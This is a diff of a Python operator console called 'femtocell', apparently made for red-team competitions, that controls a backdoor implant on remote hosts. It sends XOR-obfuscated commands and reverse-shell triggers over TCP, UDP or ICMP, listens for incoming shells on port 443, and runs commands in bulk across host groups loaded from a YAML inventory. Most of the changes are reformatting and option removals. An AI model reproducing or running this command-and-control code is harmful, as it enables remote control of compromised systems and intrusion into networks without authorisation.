@@ -10,24 +10,18 @@ import requests
 import multiprocessing
 from queue import Queue
 
-pwnboard = "http://lumbercamp.pwnboard.win/pwn/boxaccess"
+# pwnboard = "http://pwnboard.win/pwn/boxaccess"
 
 parsedConfig = {}
 
-baseparams = {
-    "MODE":"",
-    "FILE":"",
-    "XOR": True,
-    "PROXY": ""
-}
+baseparams = {"MODE": "", "FILE": "", "XOR": True}
 
 cmdparams = {
     "RHOST": "",
     "RPORT": 445,
     "LHOST": "",
-    "SPORT": 6006,
     "COMMAND": "whoami",
-    "TRANSPORT": "TCP"
+    "TRANSPORT": "TCP",
 }
 
 shellparams = {
@@ -35,8 +29,7 @@ shellparams = {
     "RPORT": 445,
     "LHOST": "",
     "LPORT": 443,
-    "SPORT": 6006,
-    "TRANSPORT": "TCP"
+    "TRANSPORT": "TCP",
 }
 
 groupparams = {
@@ -44,25 +37,26 @@ groupparams = {
     "RHOST": "",
     "RPORT": 445,
     "LHOST": "",
-    "SPORT": 6006,
     "COMMAND": "whoami",
-    "TRANSPORT": "TCP"
+    "TRANSPORT": "TCP",
 }
 
+
 def updatePwnboard(ip):
-    data = {'ip': ip, 'application': "femtocell"}
+    data = {"ip": ip, "application": "femtocell"}
     try:
         req = requests.post(pwnboard, json=data, timeout=3)
     except Exception as E:
         print(E)
 
+
 def listen(queue):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    s.bind((shellparams['LHOST'], shellparams['LPORT']))
+    s.bind((shellparams["LHOST"], shellparams["LPORT"]))
     s.listen(1)
     conn, addr = s.accept()
-    print(colored(f"[+] Shell received from: {addr}\n\n","green"))
+    print(colored(f"[+] Shell received from: {addr}\n\n", "green"))
     first = True
     TIME_WAIT = 0.50
     while True:
@@ -74,13 +68,6 @@ def listen(queue):
         else:
             command = queue.get()
 
-        if command == "!increase":
-            TIME_WAIT += 0.25
-            command = "\r"
-        elif command == "!decrease":
-            TIME_WAIT -= 0.25
-            command = "\r"
-
         command += "\n"
         conn.send(command.encode())
         time.sleep(TIME_WAIT)
@@ -88,31 +75,32 @@ def listen(queue):
         sys.stdout.write("\033[A" + ans.split("\n")[-1])
         if command == "exit\n":
             break
-    
+
     s.close()
 
 
 def pingListen():
     print(colored(f"[*] Waiting 10 seconds for callbacks.\n", "cyan"))
-    pkts = scapy.sniff(iface="bridge101", filter="icmp", timeout=10) # listen for 10 seconds for callbacks
+    pkts = scapy.sniff(
+        iface="bridge101", filter="icmp", timeout=10
+    )  # listen for 10 seconds for callbacks
     tCallbacks = []
 
     for packet in pkts:
-        if  str(packet.getlayer(scapy.ICMP).type) == "8": 
+        if str(packet.getlayer(scapy.ICMP).type) == "8":
             tCallbacks.append(packet[scapy.IP].src)
 
     fCallbacks = list(dict.fromkeys(tCallbacks))
     for ip in fCallbacks:
-        print(colored(f"[+] Ping received from: {ip}\n","green"))
+        print(colored(f"[+] Ping received from: {ip}\n", "green"))
         # updatePwnboard(ip)
 
+
 def initPing(params):
-    if baseparams["PROXY"] != "":
-        targetIP = baseparams["PROXY"]
-    else:
-        targetIP = params["LHOST"]
+    targetIP = params["LHOST"]
     pingmode = "FC-CM-{}\00".format("ping " + targetIP + " -n 1")
     return pingmode
+
 
 def validGroupKey():
     key = groupparams["GROUP"]
@@ -120,48 +108,55 @@ def validGroupKey():
     try:
         parsedConfig[key]
     except KeyError:
-        print(colored(f"[!] GROUP {key} does not exist. Setting GROUP value back to blank.\n", "red"))
+        print(
+            colored(
+                f"[!] GROUP {key} does not exist. Setting GROUP value back to blank.\n",
+                "red",
+            )
+        )
         groupparams["GROUP"] = ""
         return False
-    
+
     return True
+
 
 def getGroup():
     key = groupparams["GROUP"]
     loi = []
 
-    if parsedConfig[key] == 'hosts':
-        loi.append(parsedConfig[key+':hosts'])
-    elif parsedConfig[key] == 'children':
-        subgroups = parsedConfig[key+':children']
+    if parsedConfig[key] == "hosts":
+        loi.append(parsedConfig[key + ":hosts"])
+    elif parsedConfig[key] == "children":
+        subgroups = parsedConfig[key + ":children"]
         for item in subgroups:
-            loi.append(parsedConfig[item+':hosts'])
+            loi.append(parsedConfig[item + ":hosts"])
 
     return loi
 
+
 def importConfig(op_1):
-    config = confuse.Configuration('t', __name__)
+    config = confuse.Configuration("t", __name__)
     config.set_file(op_1)
-    configItems = config['all']['children'].get()
+    configItems = config["all"]["children"].get()
     for x in configItems:
         parsedConfig[x] = "x"
-        if configItems[x].get('hosts'):
+        if configItems[x].get("hosts"):
             parsedConfig[x] = "hosts"
             hostlist = []
-            var = list(configItems[x].get('hosts').keys())[0]
-            lIdx = var.find('[')
-            rIdx = var.find(']')
-            mIdx = var.find(':')
-            lVal = var[lIdx+1:mIdx]
-            rVal = var[mIdx+1:rIdx]
-            for i in range(int(lVal), int(rVal)+1):
+            var = list(configItems[x].get("hosts").keys())[0]
+            lIdx = var.find("[")
+            rIdx = var.find("]")
+            mIdx = var.find(":")
+            lVal = var[lIdx + 1 : mIdx]
+            rVal = var[mIdx + 1 : rIdx]
+            for i in range(int(lVal), int(rVal) + 1):
                 lHalf = var[0:lIdx]
-                rHalf = var[rIdx+1:len(var)]
+                rHalf = var[rIdx + 1 : len(var)]
                 hostlist.append(lHalf + str(i) + rHalf)
-            parsedConfig[x+":hosts"] = hostlist 
-        elif configItems[x].get('children'):
+            parsedConfig[x + ":hosts"] = hostlist
+        elif configItems[x].get("children"):
             parsedConfig[x] = "children"
-            parsedConfig[x+":children"] = list(configItems[x].get('children'))
+            parsedConfig[x + ":children"] = list(configItems[x].get("children"))
 
     baseparams["FILE"] = op_1
     print(colored(f"[+] Config {op_1} loaded.\n", "cyan"))
@@ -173,29 +168,38 @@ def print_groups():
     if not validGroupKey():
         return
 
-    if parsedConfig[key] == 'hosts':
+    if parsedConfig[key] == "hosts":
         print(key)
-        print(parsedConfig[key+':hosts'])
-    elif parsedConfig[key] == 'children':
-        subgroups = parsedConfig[key+':children']
+        print(parsedConfig[key + ":hosts"])
+    elif parsedConfig[key] == "children":
+        subgroups = parsedConfig[key + ":children"]
         for item in subgroups:
             print(item)
-            print(parsedConfig[item+":hosts"])
+            print(parsedConfig[item + ":hosts"])
 
 
 def xor_encrypt(byte_msg, byte_key):
-    encrypt_byte = b''
+    encrypt_byte = b""
     for b in byte_msg:
-        # print(byte_msg, byte_key, b)
         encrypt_byte += chr(b ^ byte_key).encode()
     return encrypt_byte
 
 
 def print_help(location):
     if location == "sub":
-        print(colored("\n[?] REQUIRED: set <key> <value>\n[?] BACK: back/exit\n[?] INFO: options\n[?] INFO: targets (GROUP mode only)\n[?] OPTIONAL: ping (group and cmd modes only)\n[?] REQUIRED: execute\n", "yellow"))
+        print(
+            colored(
+                "\n[?] REQUIRED: set <key> <value>\n[?] BACK: back/exit\n[?] INFO: options\n[?] INFO: targets (GROUP mode only)\n[?] OPTIONAL: ping (group and cmd modes only)\n[?] REQUIRED: execute\n",
+                "yellow",
+            )
+        )
     else:
-        print(colored("\n[?] REQUIRED: set mode <shell/cmd/group>\n[?] EXIT: exit\n[?] INFO: options\n[?] OPTIONAL: load <file.yml> (REQUIRED for GROUP mode)\n[?] REQUIRED: ready\n", "yellow"))
+        print(
+            colored(
+                "\n[?] REQUIRED: set mode <shell/cmd/group>\n[?] EXIT: exit\n[?] INFO: options\n[?] OPTIONAL: load <file.yml> (REQUIRED for GROUP mode)\n[?] REQUIRED: ready\n",
+                "yellow",
+            )
+        )
 
 
 def print_options(p):
@@ -207,54 +211,68 @@ def print_options(p):
 
 
 def main():
-    print("""
+    print(
+        """
     ____               __                  ____
    / __/__  ____ ___  / /_____  ________  / / /
   / /_/ _ \/ __ `__ \/ __/ __ \/ ___/ _ \/ / / 
  / __/  __/ / / / / / /_/ /_/ / /__/  __/ / /  
 /_/  \___/_/ /_/ /_/\__/\____/\___/\___/_/_/   
 
-    ~ kindtime & jake
+    ~ kindtime & a41
 
-    """)
+    """
+    )
 
     if not os.path.exists("./history"):
         os.system("mkdir history")
 
-    while(True):
-        user_in = prompt(u'FEMTOCELL // ',
-                        history=FileHistory('history/main.history'),
-                        auto_suggest=AutoSuggestFromHistory(),
-                        ).split()
-        # click.echo_via_pager(user_input)
+    while True:
+        user_in = prompt(
+            "FEMTOCELL // ",
+            history=FileHistory("history/main.history"),
+            auto_suggest=AutoSuggestFromHistory(),
+        ).split()
 
-        if(len(user_in) == 3):
+        if len(user_in) == 3:
             user_cmd = user_in[0].upper()
             op_1 = user_in[1].upper()
             op_2 = user_in[2].upper()
 
-            if(user_cmd == "SET"):
+            if user_cmd == "SET":
                 baseparams[op_1] = op_2
                 if op_1 == "MODE":
-                    if baseparams["MODE"] == "SHELL" or baseparams["MODE"] == "CMD" or baseparams["MODE"] == "GROUP":
+                    if (
+                        baseparams["MODE"] == "SHELL"
+                        or baseparams["MODE"] == "CMD"
+                        or baseparams["MODE"] == "GROUP"
+                    ):
                         pass
                     else:
-                        print(colored(f"[!] MODE {op_2} does not exist. Setting MODE value back to blank.\n", "red"))
+                        print(
+                            colored(
+                                f"[!] MODE {op_2} does not exist. Setting MODE value back to blank.\n",
+                                "red",
+                            )
+                        )
                         baseparams["MODE"] = ""
                         continue
                     print(colored(f"[*] Mode {op_2} set.\n", "cyan"))
-            elif user_cmd == "XOR":
+            elif op_1 == "XOR":
                 if op_2 == "TRUE":
                     baseparams["XOR"] = True
                 elif op_2 == "FALSE":
                     baseparams["XOR"] = False
                 else:
-                    print(colored(f"[!] XOR can only be set to TRUE or FALSE.\n", "red"))
+                    print(
+                        colored(f"[!] XOR can only be set to TRUE or FALSE.\n", "red")
+                    )
                     continue
+                    print(colored(f"[*] XOR set to {op_2}.\n", "cyan"))
         elif len(user_in) == 2:
             user_cmd = user_in[0]
             op_1 = user_in[1]
-            if (user_cmd == "load"):
+            if user_cmd == "load":
                 if os.path.exists(op_1):
                     importConfig(op_1)
                 else:
@@ -279,8 +297,8 @@ def main():
                     ready(cmdparams)
                 elif baseparams["MODE"] == "GROUP":
                     if len(parsedConfig) == 0:
-                        print(colored('[!] No config loaded.\n', "red"))
-                        continue     
+                        print(colored("[!] No config loaded.\n", "red"))
+                        continue
                     ready(groupparams)
                 else:
                     print(colored("[!] No mode set.\n", "red"))
@@ -295,10 +313,11 @@ def main():
 
 def ready(params):
     while True:
-        user_in = prompt(f'FEMTOCELL // {baseparams["MODE"]} // ',
-                        history=FileHistory('history/interact.history'),
-                        auto_suggest=AutoSuggestFromHistory(),
-                        ).split()
+        user_in = prompt(
+            f'FEMTOCELL // {baseparams["MODE"]} // ',
+            history=FileHistory("history/interact.history"),
+            auto_suggest=AutoSuggestFromHistory(),
+        ).split()
 
         if len(user_in) == 1:
             user_cmd = user_in[0].upper()
@@ -312,14 +331,14 @@ def ready(params):
             elif baseparams["MODE"] == "GROUP" and user_cmd == "TARGETS":
                 if params["GROUP"] == "":
                     print(colored("[!] No GROUP set.\n", "red"))
-                    continue    
+                    continue
                 print_groups()
             elif user_cmd == "EXECUTE":
                 if baseparams["MODE"] == "CMD" and verify(cmdparams):
                     plaintext = "FC-CM-{}\00".format(params["COMMAND"])
                     execute(plaintext, cmdparams)
                 elif baseparams["MODE"] == "SHELL" and verify(shellparams):
-                    plaintext = "FC-SH-{}\00".format(params["LHOST"]) 
+                    plaintext = "FC-SH-{}\00".format(params["LHOST"])
                     queue = multiprocessing.Queue()
                     t = multiprocessing.Process(target=listen, args=(queue,))
                     t.start()
@@ -332,7 +351,7 @@ def ready(params):
                         t.join()
                     except KeyboardInterrupt:
                         t.terminate()
-                        print(colored(f"[-] No shell received.","red")) 
+                        print(colored(f"[-] No shell received.", "red"))
                         continue
                     print(colored("\n[*] Shell closed.\n", "cyan"))
                 elif baseparams["MODE"] == "GROUP" and verify(groupparams):
@@ -352,7 +371,7 @@ def ready(params):
                     plaintext = initPing(cmdparams)
                     t = multiprocessing.Process(target=pingListen, args=())
                     t.start()
-                    time.sleep(5)
+                    time.sleep(2)
                     execute(plaintext, cmdparams)
                     t.join()
                 elif baseparams["MODE"] == "GROUP" and verify(groupparams):
@@ -362,7 +381,7 @@ def ready(params):
                     plaintext = initPing(groupparams)
                     t = multiprocessing.Process(target=pingListen, args=())
                     t.start()
-                    time.sleep(5)
+                    time.sleep(2)
                     for iplist in groupList:
                         for ip in iplist:
                             groupparams["RHOST"] = ip
@@ -370,7 +389,7 @@ def ready(params):
                     t.join()
 
                 else:
-                    print(colored('[!] PING only works on GROUP or CMD mode.\n', 'red'))
+                    print(colored("[!] PING only works on GROUP or CMD mode.\n", "red"))
                     continue
             else:
                 print_help("sub")
@@ -382,7 +401,7 @@ def ready(params):
 
             if user_cmd == "SET":
                 if op_1 in params.keys():
-                    if op_1 == "SPORT" or op_1 == "RPORT" or op_1 == "LPORT":
+                    if op_1 == "RPORT" or op_1 == "LPORT":
                         op_2 = int(op_2)
                     if op_1 == "COMMAND" or op_1 == "GROUP":
                         op_2 = op_2.lower()
@@ -401,7 +420,7 @@ def ready(params):
                     op_2 = ""
                     for i in range(2, len(user_in)):
                         op_2 = op_2 + user_in[i] + " "
-                params[op_1] = op_2.strip(' ')
+                params[op_1] = op_2.strip(" ")
                 print_options(params)
             else:
                 print_help("sub")
@@ -414,18 +433,24 @@ def ready(params):
 def verify(params):
     passing = False
 
-    if params["TRANSPORT"] == "TCP" or params["TRANSPORT"] == "UDP" or params["TRANSPORT"] == "ICMP":
+    if (
+        params["TRANSPORT"] == "TCP"
+        or params["TRANSPORT"] == "UDP"
+        or params["TRANSPORT"] == "ICMP"
+    ):
         passing = True
     else:
-        print(colored('[!] TRANSPORT set incorrectly. Setting TRANSPORT to TCP.\n', 'red'))
-        params["TRANSPORT"] == "TCP"
+        print(
+            colored("[!] TRANSPORT set incorrectly. Setting TRANSPORT to TCP.\n", "red")
+        )
+        params["TRANSPORT"] = "TCP"
 
-    if baseparams["MODE"] != "GROUP" and params["RHOST"] == "": # blank or is invalid ip
-        print(colored('[!] RHOST required.\n', 'red'))
+    if baseparams["MODE"] != "GROUP" and params["RHOST"] == "":
+        print(colored("[!] RHOST required.\n", "red"))
         passing = False
 
-    if params["LHOST"] == "": # blank or is invalid ip
-        print(colored('[!] LHOST required.\n', 'red'))
+    if params["LHOST"] == "":
+        print(colored("[!] LHOST required.\n", "red"))
         passing = False
 
     if baseparams["MODE"] == "GROUP" and not validGroupKey():
@@ -433,45 +458,45 @@ def verify(params):
 
     return passing
 
-def execute(plaintext, params):
 
+def printSendOutput(params, plaintext):
+    RHOST = params["RHOST"]
+    print(colored(f"[*] Sending {plaintext[6:]} --> {RHOST}\n", "green"))
+
+
+def execute(plaintext, params):
     if baseparams["XOR"]:
         payload = xor_encrypt(plaintext.encode(), 0x10)
     else:
         payload = plaintext.encode()
 
-    if (params["TRANSPORT"] == "UDP"):
+    if params["TRANSPORT"] == "ICMP":
+        scapy.send(
+            scapy.IP(dst=params["RHOST"].encode(), src=params["LHOST"].encode())
+            / scapy.ICMP(code=1, type=8)
+            / payload,
+            verbose=False,
+        )
+        printSendOutput(params, plaintext)
+        return
+
+    if params["TRANSPORT"] == "UDP":
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        sock.bind((params["LHOST"], params["SPORT"]))
-        sock.connect((params["RHOST"], params["RPORT"]))
-
-        sock.send(payload)
-        sock.close()
-
-        # scapy.send(scapy.IP(dst=params["RHOST"].encode(), src=params["LHOST"].encode())/
-        # scapy.UDP(sport=params["SPORT"], dport=params["RPORT"])/
-        # payload, verbose=False)
-    elif(params["TRANSPORT"] == "TCP"):
+    elif params["TRANSPORT"] == "TCP":
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        sock.bind((params["LHOST"], params["SPORT"]))
-        sock.connect((params["RHOST"], params["RPORT"]))
 
+    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    try:
+        sock.connect((params["RHOST"], params["RPORT"]))
         sock.send(payload)
+        printSendOutput(params, plaintext)
+    except TimeoutError:
+        rport = params.get("RPORT")
+        rhost = params.get("RHOST")
+        print(f"Port {rport} not open on {rhost}.")
+    finally:
         sock.close()
 
-        # scapy.send(scapy.IP(dst=params["RHOST"].encode(), src=params["LHOST"].encode())/
-        # scapy.TCP(sport=params["SPORT"], dport=params["RPORT"], flags="AP")/
-        # payload, verbose=False)
-    elif(params["TRANSPORT"] == "ICMP"):
-        scapy.send(scapy.IP(dst=params["RHOST"].encode(), src=params["LHOST"].encode())/
-        scapy.ICMP(code=1, type=8)/
-        payload, verbose=False)
 
-    RHOST = params["RHOST"]
-    print(colored(f"[*] Sending {plaintext[6:]} --> {RHOST}\n", "green"))
-
-
-if(__name__ == "__main__"):
+if __name__ == "__main__":
     main()
